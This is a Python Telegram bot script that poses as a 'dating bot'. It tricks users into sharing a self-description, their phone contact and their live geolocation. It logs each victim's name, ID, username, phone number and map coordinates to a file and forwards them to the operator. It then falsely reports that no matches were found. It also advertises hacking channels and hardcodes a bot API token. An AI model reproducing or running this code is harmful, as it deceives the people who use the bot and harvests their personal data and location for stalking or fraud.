from bot1 import ID, bot, start_bot
import telebot
from telebot import types
import time
import random
import requests

log = open('bot-log.txt', 'a+', encoding='utf-8')

YOUR_BOT_TOKEN = "6470408760:AAEy7g0RCzt4rlOTeUemm1C6bWNXdXwcug0"
YOUR_BOT_ID = "661262775"
your_bot = telebot.TeleBot(YOUR_BOT_TOKEN)

# Dictionary to store click count for each user
click_count = {}

# Function to create an inline keyboard with buttons
def create_custom_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    
    # Row 1: Join Channel 1 and Join Channel 2 buttons
    join_channel1_button = types.InlineKeyboardButton("Join Channel 1", url="https://t.me/onlinehacking")
    join_channel2_button = types.InlineKeyboardButton("Join Channel 2", url="https://t.me/termuxhacktutorial")
    markup.row(join_channel1_button, join_channel2_button)
    
    # Row 2: Check button
    check_button_text = "Welcome to the bot!" if click_count.get(user_id, 0) % 2 == 1 else "✅ Check"
    check_button = types.InlineKeyboardButton(check_button_text, callback_data="check_button")
    markup.row(check_button)
    
    return markup

bot.send_message(ID, '⚠️ In use this bot you have to join our telegram channel. \n \n After successful joining two telegram channel click check button‌ ✅', reply_markup=create_custom_keyboard(ID))
print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n")

# Handler for the "Check" button click
@bot.callback_query_handler(func=lambda call: call.data == "check_button")
def handle_check_button_click(call):
    user_id = call.message.chat.id
    click_count[user_id] = click_count.get(user_id, 0) + 1
    if click_count[user_id] % 2 == 1:
        bot.send_message(user_id, "⚠️ If you have not joined our Telegram channel, Join again and check!")
    else:
        bot.send_message(user_id, "✅ Your Bot has become Active now you can share username!")

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''👋Hello! {message.from_user.first_name}👋
This is a dating bot!
To get started, type /znak''') 
@bot.message_handler(commands=['admin'])
def start(message):
	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
@bot.message_handler(commands=['znak'])
def start(message):
	msg = bot.send_message(message.chat.id, 'First, write a little about yourself (in one message)') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		num = message.text
		bot.send_message(ID, f'Information received: {num}')
		print(num)
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''In order to use the bot, please register!''', reply_markup=keyboard)
# Catching errors
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "Registration Completed Successfully!")
		info = f'''
			Data
			├Name: {first} {last}
			├ID: {userid}
			├Nik: @{nick}
			└Phone number: {phone}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Submit your contact!')
		time.sleep(1)
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Send", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(message.chat.id, text='Send your geolocation so that the bot can find users closest to you!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Geolocation
		├ID: {message.chat.id}
		├Longitude: {lon}
		├Latitude: {lat} 
		└Cards: https://www.google.com/maps/place/{lat}+{lon} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, 'Search...')
		time.sleep(2)
		bot.send_message(message.chat.id, 'Unfortunately, there were no suitable users in the database!')
    
if __name__ == "__main__":
    start_bot()
    bot.polling(none_stop=True)
        
